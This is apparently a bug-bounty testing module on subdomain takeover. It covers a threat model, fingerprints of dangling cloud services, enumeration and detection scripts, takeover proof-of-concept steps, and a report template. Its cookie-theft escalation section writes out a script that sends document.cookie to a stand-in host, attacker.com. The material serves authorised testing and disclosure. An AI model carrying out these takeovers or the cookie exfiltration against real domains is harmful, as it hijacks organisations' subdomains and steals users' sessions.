# VULN MODULE — Subdomain Takeover
# Asset: webapp
# Append to asset/webapp/module.md when target has a broad external DNS footprint
# Report ID prefix: WEB-SUBT

## THREAT MODEL

When an organization provisions cloud or SaaS resources (GitHub Pages, S3 buckets, Heroku
apps, Azure Blob static sites, Fastly VCL services, Shopify stores) and configures DNS
CNAME records pointing to those resources, then later deprovisions the resource without
removing the DNS record, an attacker can claim the now-vacant resource and serve arbitrary
content under the victim's subdomain.

Impact range:
- Cookie theft: subdomains can set/read cookies scoped to the parent domain (e.g., evil.target.com
  sets Cookie: session=xxx; Domain=.target.com)
- Credential harvesting: login-page replica on trusted subdomain
- CSP bypass: content from *.target.com may be whitelisted in the parent's CSP
- OAuth / SAML redirect_uri: the trusted subdomain qualifies as a registered redirect URI
- SRI / script injection: if the parent page loads scripts from the subdomain
- CORS: APIs that allow *.target.com will accept requests from the taken-over subdomain

## VULNERABILITY CLASSES

1.  Dangling CNAME → GitHub Pages             CWE-284  — unclaimed GitHub Pages repo
2.  Dangling CNAME → AWS S3 Bucket            CWE-284  — unclaimed bucket in same region
3.  Dangling CNAME → Heroku App               CWE-284  — deleted Heroku dyno
4.  Dangling CNAME → Azure Blob / Static Site CWE-284  — deleted storage account
5.  Dangling CNAME → Fastly CDN               CWE-284  — deleted Fastly service
6.  Dangling CNAME → Shopify                  CWE-284  — cancelled Shopify storefront
7.  Dangling CNAME → Netlify                  CWE-284  — deleted Netlify site
8.  Dangling CNAME → Vercel                   CWE-284  — deleted Vercel deployment
9.  Dangling CNAME → ReadTheDocs              CWE-284  — unclaimed docs project
10. Dangling NS Delegation                    CWE-284  — entire subdomain zone delegated to claimable nameservers

## SERVICE FINGERPRINT TABLE

| Service        | Dangling Indicator (HTTP response body / DNS)                              | Claim Method                              |
|----------------|----------------------------------------------------------------------------|-------------------------------------------|
| GitHub Pages   | `There isn't a GitHub Pages site here.`                                    | Create `<org>.github.io` repo or user page|
| AWS S3         | `NoSuchBucket` or `The specified bucket does not exist`                    | Create bucket with exact subdomain name   |
| Heroku         | `No such app` or DNS CNAME resolves to `*.herokudns.com` → no app         | `heroku apps:create <app-name>`           |
| Azure Blob     | `404 Web Site not found` (on azurewebsites.net)                            | Create Azure static website with same name|
| Fastly         | `Fastly error: unknown domain:` in response                                | Add domain to new Fastly service          |
| Shopify        | `Sorry, this shop is currently unavailable.`                               | Create Shopify store with same domain     |
| Netlify        | `Not Found - Request ID:`                                                  | Add custom domain to Netlify site         |
| Vercel         | `The deployment could not be found on Vercel.`                             | Add domain to Vercel project              |
| ReadTheDocs    | `unknown to Read the Docs`                                                 | Create project with matching slug         |
| Pantheon       | `404 error unknown site!`                                                  | Claim site in Pantheon dashboard          |
| Cargo          | `If you're moving your domain away from Cargo`                             | Create Cargo site                         |
| HubSpot        | `Domain not configured` (hs-sites.com)                                     | Claim domain in HubSpot                   |
| Ghost (Pro)    | `404: Page not found` (ghost.io CNAME)                                     | Create Ghost Pro publication              |
| Tumblr         | `Whatever you were looking for doesn't live here`                          | Claim Tumblr blog with matching custom domain|
| Zendesk        | `Help Center Closed`                                                       | Create Zendesk with matching subdomain    |
| Surge.sh       | `project not found`                                                        | `surge` deploy with same domain           |

## WHITEBOX STATIC ANALYSIS

```bash
# Find DNS zone files or Terraform DNS resources
find . -name "*.tf" -o -name "*.tfvars" -o -name "*.json" -o -name "zone*" 2>/dev/null | \
  xargs grep -l "CNAME\|cname\|aws_route53\|azurerm_dns\|google_dns" 2>/dev/null

# Grep Terraform for CNAME records pointing to cloud services
grep -rn "CNAME\|cname_record\|aws_route53_record\|type.*CNAME" \
  --include="*.tf" --include="*.tfvars" -A5 | \
  grep -E "github\.io|s3\.amazonaws\.com|herokuapp\.com|azurewebsites\.net|fastly\.net|shopify\.com|netlify\.app|vercel\.app"

# CloudFormation DNS records
grep -rn "CNAME\|AliasTarget\|DNSName" --include="*.yaml" --include="*.json" -A5 | \
  grep -E "github\.io|s3\.amazonaws\.com|herokuapp\.com|azurewebsites\.net"

# Kubernetes ingress annotations with external-dns
grep -rn "external-dns\|hostname\|CNAME" --include="*.yaml" -A3

# CI/CD pipeline scripts that create/delete cloud resources (without DNS cleanup)
grep -rn "heroku apps:destroy\|aws s3 rb\|az storage account delete\|vercel remove\|netlify sites:delete" \
  --include="*.sh" --include="*.yml" --include="*.yaml" -B5 -A5
# Flag: resource deletion without corresponding DNS record removal

# Check for dangling cloud resource references in infrastructure docs
grep -rn "decommission\|deprecated\|to.*remove\|TODO.*delete" \
  --include="*.tf" --include="*.yaml" --include="*.md" -B2 -A2
```

## BLACKBOX TESTING PLAYBOOK

### Step 1 — Subdomain enumeration
```bash
TARGET="target.com"

# Passive enumeration (no DNS brute force)
subfinder -d $TARGET -silent -o subdomains_passive.txt
amass enum -passive -d $TARGET -o subdomains_amass.txt
# Certificate transparency:
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | \
  python3 -c "import sys,json; [print(e['name_value']) for e in json.load(sys.stdin)]" | \
  sort -u > subdomains_ct.txt

# Merge and deduplicate
cat subdomains_passive.txt subdomains_amass.txt subdomains_ct.txt | sort -u > all_subdomains.txt
wc -l all_subdomains.txt

# Active DNS resolution — identify NXDOMAIN or dangling CNAMEs
dnsx -l all_subdomains.txt -resp -cname -o dns_results.txt
# Look for: CNAME records where the target no longer exists (NXDOMAIN on final record)
```

### Step 2 — Identify dangling CNAMEs
```bash
# Extract CNAMEs pointing to known cloud services
grep -E "github\.io|s3\.amazonaws\.com|s3-website|herokuapp\.com|azurewebsites\.net|cloudapp\.azure\.com|fastly\.net|shopify\.com|myshopify\.com|netlify\.app|vercel\.app|readthedocs\.io|ghost\.io|surge\.sh|zendesk\.com|tumblr\.com|cargo\.site|hs-sites\.com" \
  dns_results.txt > cloud_cnames.txt

# For each CNAME, check if the resource is actually provisioned:
while IFS= read -r line; do
  subdomain=$(echo "$line" | awk '{print $1}')
  cname=$(echo "$line" | awk '{print $NF}')
  status=$(curl -sk -o /dev/null -w "%{http_code}" "https://$subdomain" --connect-timeout 5 --max-time 10)
  body=$(curl -sk "https://$subdomain" --connect-timeout 5 --max-time 10 | head -c 500)
  echo "[$status] $subdomain → $cname | $body"
done < cloud_cnames.txt

# Also check for NXDOMAIN on the CNAME target (the final resolved host):
while IFS= read -r cname_target; do
  host "$cname_target" 2>&1 | grep -q "NXDOMAIN\|not found" && echo "DANGLING: $cname_target"
done < <(grep -oP 'CNAME\s+\K\S+' dns_results.txt)
```

### Step 3 — Service-specific fingerprint matching
```bash
# Run nuclei with takeover templates
nuclei -l all_subdomains.txt -t takeovers/ -o nuclei_takeovers.txt

# Manual fingerprint check for high-value services:
# GitHub Pages
curl -sk "https://SUBDOMAIN.target.com" | grep -q "There isn't a GitHub Pages site here" && \
  echo "VULNERABLE: GitHub Pages takeover"

# AWS S3
curl -sk "https://SUBDOMAIN.target.com" | grep -qE "NoSuchBucket|The specified bucket does not exist" && \
  echo "VULNERABLE: S3 takeover"

# Heroku
curl -sk "https://SUBDOMAIN.target.com" | grep -q "No such app" && \
  echo "VULNERABLE: Heroku takeover"

# Azure
curl -sk "https://SUBDOMAIN.target.com" | grep -q "404 Web Site not found" && \
  echo "VULNERABLE: Azure takeover"

# Fastly
curl -sk "https://SUBDOMAIN.target.com" | grep -q "Fastly error: unknown domain" && \
  echo "VULNERABLE: Fastly takeover"

# Shopify
curl -sk "https://SUBDOMAIN.target.com" | grep -q "Sorry, this shop is currently unavailable" && \
  echo "VULNERABLE: Shopify takeover"
```

### Step 4 — NS delegation takeover
```bash
# Check if subdomain is delegated to claimable nameservers
dig NS sub.target.com +short
# If NS records point to nameservers not under target.com's control:
# - freedns.afraid.org, he.net, cloudns.net, etc.
# Register the zone on that provider and claim delegation

# Check for NXDOMAIN on NS target itself:
for ns in $(dig NS sub.target.com +short); do
  host $ns 2>&1 | grep -q "NXDOMAIN" && echo "DANGLING NS: $ns"
done
```

## DYNAMIC CONFIRMATION

### PoC: GitHub Pages takeover
```
Precondition: SUBDOMAIN.target.com CNAME → ORGNAME.github.io (NXDOMAIN / Pages not found)

1. Create GitHub repository named ORGNAME.github.io (if CNAME is orgname.github.io)
   OR create repository with Pages enabled and configured custom domain = SUBDOMAIN.target.com
2. Push index.html with canary content:
   <html><body>BugBounty-PoC-[YOUR_HANDLE]: subdomain takeover confirmed on SUBDOMAIN.target.com</body></html>
3. Enable GitHub Pages on the repository (Settings → Pages → Source: main branch)
4. Wait for DNS propagation (typically < 2 minutes for already-cached CNAMEs)
5. Visit https://SUBDOMAIN.target.com — canary content renders
Confirmation: screenshot showing your canary content served from victim subdomain.
IMPORTANT: Remove canary immediately after screenshot. Replace with benign redirect or 404.
```

### PoC: AWS S3 bucket takeover
```
Precondition: SUBDOMAIN.target.com CNAME → SUBDOMAIN.target.com.s3.amazonaws.com → NoSuchBucket

1. Create S3 bucket with exact name matching the CNAME target:
   aws s3 mb s3://SUBDOMAIN.target.com --region us-east-1
   (Region must match — try the region implied by the CNAME endpoint)
2. Enable static website hosting:
   aws s3 website s3://SUBDOMAIN.target.com --index-document index.html
3. Upload canary:
   echo "<html><body>BugBounty-PoC: S3 takeover on SUBDOMAIN.target.com</body></html>" > index.html
   aws s3 cp index.html s3://SUBDOMAIN.target.com --acl public-read
4. Set bucket policy for public read
5. Visit http://SUBDOMAIN.target.com — canary renders
Confirmation: screenshot. Remove bucket / make private after confirming.
```

### PoC: Cookie theft via subdomain takeover (escalation path)
```
Once takeover is confirmed:
1. Host JavaScript that reads and exfiltrates document.cookie:
   <script>
   fetch("https://attacker.com/steal?c=" + encodeURIComponent(document.cookie));
   </script>
2. If cookies are scoped to .target.com (not HttpOnly), subdomain can read them
3. Confirm by visiting the taken-over subdomain from a session authenticated to target.com
4. Check if any session cookies arrive at attacker.com
Escalation: if session cookies captured = ATO via subdomain takeover
```

## REPORT_BUNDLE FIELDS

```json
{
  "vulnerability_class": "Subdomain Takeover",
  "cwe": "CWE-284",
  "affected_endpoint": "https://SUBDOMAIN.target.com",
  "affected_parameter": "DNS CNAME record",
  "evidence": {
    "cname_record": "SUBDOMAIN.target.com → ORGNAME.github.io",
    "fingerprint_response": "There isn't a GitHub Pages site here.",
    "takeover_confirmed": "https://SUBDOMAIN.target.com returns attacker-controlled content",
    "screenshot": "<path or URL to screenshot>",
    "dns_output": "dig CNAME SUBDOMAIN.target.com +short"
  },
  "impact": "Attacker controls content served from trusted subdomain; enables cookie theft, phishing, CSP bypass, OAuth redirect_uri abuse",
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
  "remediation": "Remove dangling DNS CNAME record immediately; implement DNS record lifecycle policy requiring DNS cleanup before resource deprovisioning; use takeover scanning in CI/CD pipeline"
}
```

## TOOLS

```bash
# subfinder — passive subdomain enumeration
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
subfinder -d target.com -silent

# amass — active/passive enumeration with graph analysis
go install -v github.com/owasp-amass/amass/v4/...@master
amass enum -passive -d target.com

# dnsx — fast DNS resolution with CNAME chasing
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
dnsx -l subdomains.txt -resp -cname

# nuclei — automated takeover template scanning
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nuclei -l subdomains.txt -t nuclei-templates/takeovers/

# subzy — dedicated subdomain takeover checker
go install -v github.com/PentestPad/subzy@latest
subzy run --targets subdomains.txt

# subjack — another takeover checker with fingerprint database
go install github.com/haccer/subjack@latest
subjack -w subdomains.txt -t 100 -o results.txt -ssl -c fingerprints.json

# can-i-take-over-xyz — fingerprint reference database
# https://github.com/EdOverflow/can-i-take-over-xyz
```
